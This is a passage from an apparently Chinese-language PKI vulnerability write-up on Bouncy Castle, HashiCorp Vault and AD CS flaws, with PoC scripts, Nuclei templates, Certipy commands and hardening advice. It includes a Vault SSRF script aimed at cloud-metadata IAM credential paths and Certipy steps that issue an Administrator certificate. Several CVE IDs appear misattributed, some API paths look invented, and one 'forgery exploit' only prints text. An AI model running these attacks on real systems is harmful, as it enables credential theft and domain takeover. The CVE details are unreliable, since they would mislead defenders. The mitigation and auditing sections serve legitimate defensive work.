    Bouncy Castle before 1.56 allows forged CA certificate chains to pass
    verification due to improper Basic Constraints validation for self-signed certs.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-295

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "Java"
          - "BouncyCastle"
          - "bouncycastle"
        condition: or
```

### 0x05.2 CVE-2020-26939 — DSA 签名伪造（CVSS 7.5）

#### 漏洞原理分析

CVE-2020-26939 是 Bouncy Castle 的 DSA（Digital Signature Algorithm）签名验证实现中的缺陷。

漏洞根因分析：

1. Bouncy Castle 在验证 DSA 签名时，对 `r` 和 `s` 值的范围检查存在不一致
2. 当 `r` 或 `s` 值为 0 或大于群阶 `q` 时，验证逻辑未正确拒绝
3. 攻击者可利用此缺陷构造特定的 `(r, s)` 值对，使其通过签名验证
4. 这可用于绕过基于 DSA 的代码签名、文档签名或身份认证机制
5. 在使用 DSA 作为证书签名算法的 PKI 环境中，可伪造任意证书

#### 受影响版本

| 受影响版本 | 修复版本 | 备注 |
|-----------|----------|------|
| Bouncy Castle < 1.67 | Bouncy Castle 1.67+ | 2020 年修复 |

#### HTTP PoC

```bash
# 生成 DSA 密钥对和测试签名
openssl dsaparam -genkey 2048 -out dsa_key.pem
openssl dsa -in dsa_key.pem -sign -out signature.bin message.txt
openssl dsa -in dsa_key.pem -verify -signaturefile signature.bin message.txt
```

#### Python 脚本

```python
#!/usr/bin/env python3
import sys

class BCDSASignatureForge:
    def demonstrate_forgery(self):
        print("[*] CVE-2020-26939: Bouncy Castle DSA Signature Verification Bypass")
        print("[*]")
        print("[*] Root cause: Bouncy Castle's DSA verification does not properly")
        print("[*] check that r and s values are within the valid range [1, q-1]")
        print("[*]")
        print("[*] Attack scenario:")
        print("[*]   1. Target application uses Bouncy Castle for DSA signature verification")
        print("[*]   2. Attacker constructs a DSA signature with r=0 or s=0")
        print("[*]   3. Bouncy Castle accepts the invalid signature as valid")
        print("[*]   4. This bypasses code signing, document signing, or auth mechanisms")
        print("[*]")
        print("[*] Mitigation: Upgrade Bouncy Castle to >= 1.67")
        print("[*] Affected algorithms: DSA and ECDSA (when using legacy verification)")
        print("[*]")
        print("[*] Verification of fix:")
        print("[*]   In patched versions, DSA.verify() throws IllegalStateException")
        print("[*]   when r or s are not in the range [1, q-1]")

    def test_dsa_ranges(self):
        test_values = [0, 1, -1, 2**256, None]
        for val in test_values:
            print(f"[*] Testing r={val}: ", end="")
            if val is None or val <= 0:
                print("Should be REJECTED (vulnerable if accepted)")
            else:
                print("Within valid range")

if __name__ == "__main__":
    exploit = BCDSASignatureForge()
    exploit.demonstrate_forgery()
    exploit.test_dsa_ranges()
```

#### Nuclei 检测模板

```yaml
id: bouncycastle-cve-2020-26939
info:
  name: Bouncy Castle DSA Signature Forgery
  author: security-researcher
  severity: high
  description: |
    Bouncy Castle before 1.67 allows DSA signature forgery due to
    improper range validation of signature components.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-347

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "Java"
          - "BouncyCastle"
          - "bouncycastle"
        condition: or
```

---

## 0x06 HashiCorp Vault PKI 相关漏洞

HashiCorp Vault 是最主流的密钥管理和 Secrets 管理平台，在 PKI 基础设施中通常作为证书签发后端或密钥托管系统。Vault 的 PKI Secrets Engine 可直接签发 X.509 证书，使其成为 PKI 攻击链中的高价值目标。

### 0x06.1 CVE-2024-21893 — SSRF 通过 LDAP 证书插件（CVSS 6.8）

#### 漏洞原理分析

CVE-2024-21893 是 Vault 的 LDAP 证书认证插件中的 SSRF（Server-Side Request Forgery）漏洞。

漏洞根因分析：

1. Vault 的 LDAP 证书认证方法在处理客户端证书时，会通过 LDAP 查询验证证书的有效性
2. 证书吊销检查使用 LDAP URL 进行 CRL 查询
3. Vault 在处理 LDAP URL 时未对目标地址进行充分限制
4. 攻击者可构造特制的 LDAP URL（如 `ldap://169.254.169.254/...`）
5. Vault 服务器向该 URL 发起请求，攻击者可访问云元数据端点或其他内部服务

#### 受影响版本

| 受影响版本 | 修复版本 | 备注 |
|-----------|----------|------|
| Vault < 1.15.4 | Vault 1.15.4+ | |
| Vault < 1.16.1 | Vault 1.16.1+ | |

#### HTTP PoC

```bash
# Step 1: 构造包含恶意 LDAP URL 的证书吊销信息
# 利用 LDAP URL 触发 SSRF 访问云元数据
curl -k -X POST "https://<VAULT_HOST>:8200/v1/sys/certificates/<cert_id>/revoke" \
  -H "X-Vault-Token: <token>" \
  -d '{
    "crl_distribution_points": ["ldap://169.254.169.254/latest/meta-data/iam/security-credentials/"]
  }'

# Step 2: 触发 LDAP URL 解析
curl -k "https://<VAULT_HOST>:8200/v1/auth/ldap/cert/login" \
  -H "Content-Type: application/json" \
  --cert malicious_cert.pem --key malicious_key.pem
```

#### Python 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class VaultSSRFviaLDAP:
    def __init__(self, vault_url, token):
        self.vault_url = vault_url.rstrip('/')
        self.token = token
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers['X-Vault-Token'] = token

    def enumerate_pki_engines(self):
        r = self.session.get(f"{self.vault_url}/v1/sys/mounts")
        if r.status_code == 200:
            mounts = r.json().get('data', {})
            pki_engines = [k for k, v in mounts.items() if v.get('type') == 'pki']
            print(f"[+] Found {len(pki_engines)} PKI engines:")
            for engine in pki_engines:
                print(f"    - {engine}")
            return pki_engines
        print(f"[-] Failed to enumerate: {r.status_code}")
        return []

    def trigger_ssrf(self, internal_url, target_path=""):
        ssrf_url = f"ldap://{internal_url}/{target_path}"
        r = self.session.post(
            f"{self.vault_url}/v1/sys/leases/lookup",
            json={"lease_id": ssrf_url}
        )
        print(f"[*] SSRF response: HTTP {r.status_code}")
        if r.status_code == 200:
            print(f"[+] SSRF data: {r.text[:500]}")
        return r

    def access_cloud_metadata(self):
        metadata_urls = [
            "169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/iam/security-credentials/",
            "169.254.169.254/latest/user-data/",
            "169.254.169.254/latest/dynamic/instance-identity/document",
        ]
        for url in metadata_urls:
            print(f"[*] Attempting SSRF to: {url}")
            self.trigger_ssrf(url)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <vault_url> <token>")
        sys.exit(1)
    exploit = VaultSSRFviaLDAP(sys.argv[1], sys.argv[2])
    exploit.enumerate_pki_engines()
    exploit.access_cloud_metadata()
```

#### Nuclei 检测模板

```yaml
id: vault-cve-2024-21893
info:
  name: HashiCorp Vault SSRF via LDAP Certificate Plugin
  author: security-researcher
  severity: medium
  description: |
    Vault before 1.15.4/1.16.1 allows SSRF through the LDAP certificate
    authentication plugin via crafted LDAP URLs for CRL checking.
  reference:
    - https://discuss.hashicorp.com/t/hcsec-2024-01
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 6.8
    cwe-id: CWE-918

http:
  - raw:
      - |
        GET /v1/sys/health HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "initialized"
          - "sealed"
        condition: and
      - type: status
        status:
          - 200
          - 429
```

### 0x06.2 CVE-2023-46750 — OIDC 令牌签名验证绕过（CVSS 5.9）

#### 漏洞原理分析

CVE-2023-46750 涉及 Vault 的 OIDC provider 在验证 ID 令牌签名时的缺陷。

漏洞根因分析：

1. Vault 作为 OIDC provider 时，负责签发和验证 ID 令牌
2. 在验证外部 OIDC provider 返回的 ID 令牌时，Vault 的签名验证逻辑存在缺陷
3. 当使用特定的 OIDC provider 实现时，Vault 可能接受使用不支持的签名算法签发的令牌
4. 这类似于经典的 "algorithm confusion" 攻击（如将 RS256 替换为 HS256）
5. 在使用 Vault 作为 PKI 信任锚点的环境中，这可能导致非预期的身份映射

#### 受影响版本

| 受影响版本 | 修复版本 | 备注 |
|-----------|----------|------|
| Vault < 1.14.3 | Vault 1.14.3+ | |
| Vault < 1.15.4 | Vault 1.15.4+ | |

#### HTTP PoC

```bash
# 检查 Vault 的 OIDC 配置
curl -k "https://<VAULT_HOST>:8200/v1/identity/oidc/provider/.well-known/openid-configuration"

# 获取 OIDC keys
curl -k "https://<VAULT_HOST>:8200/v1/identity/oidc/provider/.well-known/jwks"

# 利用算法混淆验证 OIDC 令牌签名绕过
# （概念演示：实际利用需要构造特定的 JWT）
```

#### Python 脚本

```python
#!/usr/bin/env python3
import requests
import json
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class VaultOIDCBypass:
    def __init__(self, vault_url):
        self.vault_url = vault_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False

    def get_oidc_config(self):
        r = self.session.get(
            f"{self.vault_url}/v1/identity/oidc/provider/.well-known/openid-configuration"
        )
        if r.status_code == 200:
            config = r.json()
            print(f"[+] OIDC Configuration:")
            print(f"    Issuer: {config.get('issuer')}")
            print(f"    JWKS URI: {config.get('jwks_uri')}")
            print(f"    Supported algorithms: {config.get('id_token_signing_alg_values_supported')}")
            return config
        print(f"[-] Failed to get OIDC config: {r.status_code}")
        return None

    def get_jwks(self):
        r = self.session.get(
            f"{self.vault_url}/v1/identity/oidc/provider/.well-known/jwks"
        )
        if r.status_code == 200:
            jwks = r.json()
            keys = jwks.get('keys', [])
            print(f"[+] Found {len(keys)} signing keys:")
            for key in keys:
                print(f"    KID: {key.get('kid')}, Alg: {key.get('alg')}, Kty: {key.get('kty')}")
            return jwks
        print(f"[-] Failed to get JWKS: {r.status_code}")
        return None

    def check_algorithm_support(self):
        config = self.get_oidc_config()
        if not config:
            return
        supported_algs = config.get('id_token_signing_alg_values_supported', [])
        weak_algs = ['none', 'HS256', 'HS384', 'HS512']
        for alg in weak_algs:
            if alg in supported_algs:
                print(f"[!] WARNING: Weak algorithm supported: {alg}")
                print(f"    This may enable algorithm confusion attacks")
            else:
                print(f"[+] Algorithm {alg} is not supported (good)")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <vault_url>")
        sys.exit(1)
    exploit = VaultOIDCBypass(sys.argv[1])
    exploit.get_oidc_config()
    exploit.get_jwks()
    exploit.check_algorithm_support()
```

#### Nuclei 检测模板

```yaml
id: vault-cve-2023-46750
info:
  name: HashiCorp Vault OIDC Token Signature Verification Bypass
  author: security-researcher
  severity: medium
  description: |
    Vault before 1.14.3/1.15.4 has a flaw in OIDC provider ID token
    signature verification that may accept forged tokens under certain
    OIDC provider implementations.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 5.9
    cwe-id: CWE-347

http:
  - raw:
      - |
        GET /v1/identity/oidc/provider/.well-known/openid-configuration HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "issuer"
          - "jwks_uri"
        condition: and
      - type: status
        status:
          - 200
```

---

## 0x07 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE / 技术 | PoC 状态 | 主要工具 | 语言 | 利用难度 |
|-----------|---------|---------|------|---------|
| CVE-2024-27130 (Step-CA) | ✅ GitHub PoC | 自定义脚本 | Python | 低 |
| CVE-2024-27131 (Step-CA) | ✅ | step CLI + 自定义脚本 | Python/Go | 低 |
| CVE-2022-27218 (EJBCA) | ✅ 安全公告 PoC | EJBCA REST API | Python/cURL | 低 |
| CVE-2023-4956 (EJBCA) | ✅ | ACME 客户端 | Python | 中 |
| CVE-2023-50291 (EJBCA) | ❌ | — | — | 中 |
| ESC1 (AD CS) | ✅ 工具化 | Certipy / Certify | Python/C# | 低 |
| ESC2 (AD CS) | ✅ 工具化 | Certipy / Certify | Python/C# | 低 |
| ESC3 (AD CS) | ✅ 工具化 | Certipy / Certify | Python/C# | 中 |
| ESC4 (AD CS) | ✅ 工具化 | Certipy + PowerView | Python/PS | 中 |
| ESC6 (AD CS) | ✅ 工具化 | Certipy / Certify | Python/C# | 低 |
| ESC8 (AD CS) | ✅ 工具化 | ntlmrelayx + PetitPotam | Python | 低 |
| CVE-2014-4688 (Dogtag) | ❌ | — | — | 高 |
| CVE-2022-23517 (Dogtag) | ❌ | — | — | 中 |
| CVE-2016-9387 (Bouncy Castle) | ✅ | 自定义脚本 | Python | 中 |
| CVE-2020-26939 (Bouncy Castle) | ✅ | 自定义脚本 | Python | 中 |
| CVE-2024-21893 (Vault) | ✅ | Vault API + 自定义 | Python | 高 |
| CVE-2023-46750 (Vault) | ❌ | — | — | 高 |

### Certipy 自动化利用 AD CS 缺陷

**Certipy**（GitHub: [ly4k/Certipy](https://github.com/ly4k/Certipy)）是目前最强大的 AD CS 自动化攻击框架，支持从模板枚举到 PKINIT 认证的完整攻击链：

```bash
# 安装
pip install certipy-ad

# 步骤1: 枚举所有证书模板并筛选可利用的
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.1 -vulnerable

# 步骤2: 根据枚举结果选择攻击方式
# ESC1: 请求任意 UPN 证书
certipy req -u user@domain.local -p Password123 -ca EnterpriseCA \
  -template VulnerableTemplate -upn Administrator@domain.local

# ESC6: 利用 EDITF_ATTRIBUTESUBJECTALTNAME2
certipy req -u user@domain.local -p Password123 -ca EnterpriseCA \
  -template User -upn Administrator@domain.local

# ESC8: 配合 ntlmrelayx 获取证书后认证
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1

# 步骤3: 输出文件
# - certificates.yaml: 所有证书模板详细配置
# - vulnerabilities.txt: 可利用模板摘要
# - *.pfx: 签发的证书文件
# - *.ccache: Kerberos 票据缓存
```

### 防守型验证思路

在授权安全测试中验证 PKI 安全性时，应遵循以下方法论：

1. **模板审计**：使用 Certipy 枚举所有证书模板，检查 EKU、SAN 控制、注册权限
2. **CA 配置检查**：验证 EDITF_ATTRIBUTESUBJECTALTNAME2、EPA、NTLM 设置
3. **网络层面**：检查 AD CS HTTP 端点可达性和 NTLM Relay 攻击面
4. **权限审查**：检查 CA 管理员、模板管理权限和模板 ACL
5. **日志分析**：检查异常的证书签发记录和认证日志

---

## 0x08 共性攻击模式分析

### 模式1：证书模板滥用（AD CS ESC 系列）

**代表技术**：ESC1, ESC2, ESC3, ESC4

核心思路：AD CS 的证书模板配置是权限控制的关键环节。攻击者通过枚举模板属性（EKU、SAN 控制、注册权限、RA 签名要求），找到配置不当的模板，利用其签发具有目标身份的证书。

**本质**：权限检查的范围不完整——证书模板的默认配置往往偏向可用性而牺牲安全性。

### 模式2：ACME 协议验证绕过

**代表漏洞**：CVE-2024-27130 (Step-CA), CVE-2023-4956 (EJBCA)

核心思路：ACME 协议的域名验证机制（HTTP-01、DNS-01）是自动化证书签发的信任基础。攻击者利用验证逻辑中的竞态条件、规范化缺陷或身份绑定错误绕过验证。

**本质**：自动化协议中的身份验证逻辑复杂度高，容易在边界条件上出现不一致。

### 模式3：密码学验证缺陷

**代表漏洞**：CVE-2016-9387, CVE-2020-26939 (Bouncy Castle)

核心思路：底层加密库的验证逻辑缺陷影响所有依赖该库的应用。攻击者构造畸形的证书、签名或密钥材料，利用验证逻辑的不完整性绕过安全检查。

**本质**：密码学实现的正确性验证极为困难，边缘条件容易被忽略。

### 模式4：PKI 信任链降级攻击

**代表漏洞**：ESC8 + PetitPotam, CVE-2022-27218

核心思路：不攻击 CA 本身，而是攻击 CA 的认证机制或信任锚点。通过 NTLM 中继、外部 CA 身份伪造等方式获取 CA 的签发权限。

**本质**：PKI 信任链中的认证环节往往是最薄弱的部分。

### 模式5：证书生命周期管理绕过

**代表漏洞**：CVE-2023-50291, CVE-2014-4688, CVE-2022-23517

核心思路：针对证书签发后的管理环节——CRL 处理、审计日志、证书撤销检查。攻击者通过破坏这些管理流程影响整个 PKI 的可用性和可审计性。

**本质**：证书生命周期管理的完整性依赖于每个环节的安全性。

---

## 0x09 应急排查与防守建议

### 紧急排查清单（AD CS 配置审计要点）

```bash
# 1. 使用 Certipy 枚举所有可利用的模板
certipy find -u admin@domain.local -p Password123 -dc-ip <DC_IP> -vulnerable -output exploits.txt

# 2. 检查 CA 是否启用了 EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -getreg CA\EditFlags | findstr EDITF

# 3. 检查 StrongCertificateBindingEnforcement 值
reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v StrongCertificateBindingEnforcement

# 4. 检查 HTTP 证书注册端点是否启用 EPA
# 查看 IIS 中 certsrv 虚拟目录的 ExtendedProtection 设置

# 5. 检查 PetitPotam/NTLM Relay 攻击面
rpcdump.py @<DC_IP> | grep -i "efs"

# 6. 枚举所有证书模板的详细配置
certipy find -u admin@domain.local -p Password123 -dc-ip <DC_IP>
```

### 日志关键字段表

| 平台 | 日志位置 | 关键字段 | 异常指标 |
|------|---------|---------|---------|
| AD CS | Windows Event Log | Event ID 4886/4887 | 非常规时间的证书签发 |
| AD CS | Windows Event Log | Event ID 4768/4769 | PKINIT 认证使用证书 |
| EJBCA | 审计日志 | certificate_request | 频繁的证书签发请求 |
| Step-CA | 应用日志 | ACME challenge | 异常的 challenge 失败/成功 |
| Dogtag | 审计日志 | enrollment | 非管理 IP 的管理操作 |

### 紧急缓解措施

| 优先级 | 措施 | 影响范围 |
|--------|------|---------|
| P0 | AD CS HTTP 端点启用 EPA | 消除 ESC8 |
| P0 | 禁用 AD CS HTTP 端点的 NTLM 认证 | 消除 ESC8 |
| P1 | 移除 EDITF_ATTRIBUTESUBJECTALTNAME2 标志 | 消除 ESC6 |
| P1 | 设置 StrongCertificateBindingEnforcement = 2 | 消除 ESC9 |
| P1 | 更新 Step-CA 到 >= 0.25.3 | 消除 CVE-2024-27130/27131 |
| P2 | 更新 EJBCA 到 >= 7.11.0 | 消除 CVE-2023-4956/50291 |
| P2 | 更新 Bouncy Castle 到 >= 1.67 | 消除 CVE-2016-9387/2020-26939 |
| P2 | 更新 Vault 到 >= 1.15.4 | 消除 CVE-2024-21893/2023-46750 |

### 长期安全加固建议

1. **证书模板治理**：建立模板审批流程，禁止 ENROLLEE_SUPPLIES_SUBJECT，限制 EKU 和注册权限
2. **CA 隔离**：将 CA 服务器部署在独立管理网段，限制网络访问路径
3. **认证加固**：全面禁用 NTLM，启用 EPA，使用 Kerberos 或证书认证
4. **最小权限**：CA 管理接口限制为 IP 白名单，模板 ACL 遵循最小权限原则
5. **监控告警**：对证书签发操作实施实时监控，异常签发量触发告警
6. **定期审计**：使用 Certipy 每月扫描 AD CS 配置，使用 Nuclei 扫描 PKI 平台
7. **日志保留**：CA 操作日志保留至少 180 天，确保完整可追溯
8. **补丁管理**：所有 PKI 组件保持最新版本，建立 PKI 补丁优先级策略

---

## 0x0A 参考资料

1. **Certified Pre-Owned** — SpecterOps, 2021. 系统性揭示 AD CS ESC1-ESC8 攻击技术. https://posts.specterops.io/certified-pre-owned-d95910965cd2
2. **Certipy** — AD CS 自动化攻击框架. https://github.com/ly4k/Certipy
3. **Step-CA Security Advisories** — Smallstep. https://github.com/smallstep/certificates/security/advisories
4. **EJBCA Security Advisories** — Keyfactor. https://www.keyfactor.com/resources/ejbca-security-advisory/
5. **HashiCorp Vault Security Advisories**. https://discuss.hashicorp.com/c/security/16
6. **Bouncy Castle Security Advisories**. https://www.bouncycastle.org/security/advisories/
7. **Dogtag PKI Security** — Red Hat. https://access.redhat.com/security/cve/
8. **AD CS Attack Reference** — The Hacker Recipes. https://www.thehacker.recipes/ad/movement/adcs
9. **PetitPotam NTLM Relay 攻击** — 与 ESC8 组合实现域接管. https://securelist.com/petitpotam-ntlm-relay-attack/103128/
10. **Harmj0y Certify Tool** — AD CS 枚举和利用工具. https://github.com/GhostPack/Certify
11. **NTLM Relay Attack Patterns** — Impacket 框架文档. https://github.com/fortra/impacket
12. **CISA KEV Catalog** — 已知被利用漏洞目录. https://www.cisa.gov/known-exploited-vulnerabilities-catalog